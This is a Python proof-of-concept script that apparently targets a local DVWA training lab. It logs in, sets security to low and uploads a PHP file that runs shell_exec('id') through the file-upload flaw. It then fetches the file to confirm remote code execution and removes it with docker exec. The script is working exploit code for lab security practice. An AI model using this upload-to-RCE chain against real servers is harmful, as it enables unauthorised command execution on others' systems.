import os
import re
import subprocess
import sys
from pathlib import Path

import requests

BASE = "http://127.0.0.1:4280"
REMOTE_NAME = "hermes-rce-probe.php"
REMOTE_PATH = f"/var/www/html/hackable/uploads/{REMOTE_NAME}"
PUBLIC_PATH = f"/hackable/uploads/{REMOTE_NAME}"
USERNAME = os.environ.get("DVWA_USER")
PASSWORD = os.environ.get("DVWA_PASSWORD")

if not USERNAME or not PASSWORD:
    raise SystemExit("Set DVWA_USER and DVWA_PASSWORD in the shell environment.")

payload = b'<?php echo "UPLOAD_RCE_PROOF\\n"; echo shell_exec("id"); ?>'
session = requests.Session()
session.trust_env = False
created = False

def stop(message: str) -> None:
    raise RuntimeError(message)

try:
    login_page = session.get(f"{BASE}/login.php", timeout=10)
    login_page.raise_for_status()
    match = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)", login_page.text)
    if not match:
        stop("Login page did not provide user_token; no upload attempted.")
    login = session.post(
        f"{BASE}/login.php",
        data={"username": USERNAME, "password": PASSWORD, "Login": "Login", "user_token": match.group(1)},
        allow_redirects=True,
        timeout=10,
    )
    if "login.php" in login.url or "Login failed" in login.text:
        stop("DVWA login failed; no upload attempted.")
    session.cookies.set("security", "low", domain="127.0.0.1", path="/")

    target = session.get(f"{BASE}{PUBLIC_PATH}", timeout=10)
    if target.status_code != 404:
        stop(f"Refusing to overwrite an existing path (GET status {target.status_code}).")

    created = True
    upload = session.post(
        f"{BASE}/vulnerabilities/upload/",
        data={"Upload": "Upload"},
        files={"uploaded": (REMOTE_NAME, payload, "application/octet-stream")},
        timeout=15,
    )
    upload.raise_for_status()
    if "succesfully uploaded" not in upload.text:
        stop(f"Upload was not confirmed; HTTP {upload.status_code}. No execution claim.")
    created = True
    print(f"upload: HTTP {upload.status_code}, success message present")

    result = session.get(f"{BASE}{PUBLIC_PATH}", timeout=10)
    body = result.text
    php_executed = "UPLOAD_RCE_PROOF" in body and "<?php" not in body
    command_executed = "uid=" in body
    print(f"fetch: HTTP {result.status_code}; PHP marker executed={php_executed}; id output observed={command_executed}")
    if not (php_executed and command_executed):
        print("Response excerpt:")
        print(body[:500])
        raise RuntimeError("RCE acceptance criteria not met.")
    print("RCE_PROBE_VERIFIED")
finally:
    if created:
        cleanup = subprocess.run(
            ["docker", "exec", "web-security-lab-dvwa-1", "rm", "-f", REMOTE_PATH],
            capture_output=True,
            text=True,
            timeout=15,
        )
        verify = subprocess.run(
            ["docker", "exec", "web-security-lab-dvwa-1", "php", "-r", f'echo file_exists("{REMOTE_PATH}") ? "PRESENT\\n" : "REMOVED\\n";'],
            capture_output=True,
            text=True,
            timeout=15,
        )
        print("cleanup:", verify.stdout.strip() or cleanup.stderr.strip() or "no confirmation")
        if cleanup.returncode or "REMOVED" not in verify.stdout:
            print("WARNING: cleanup could not be verified; inspect exact path:", REMOTE_PATH, file=sys.stderr)
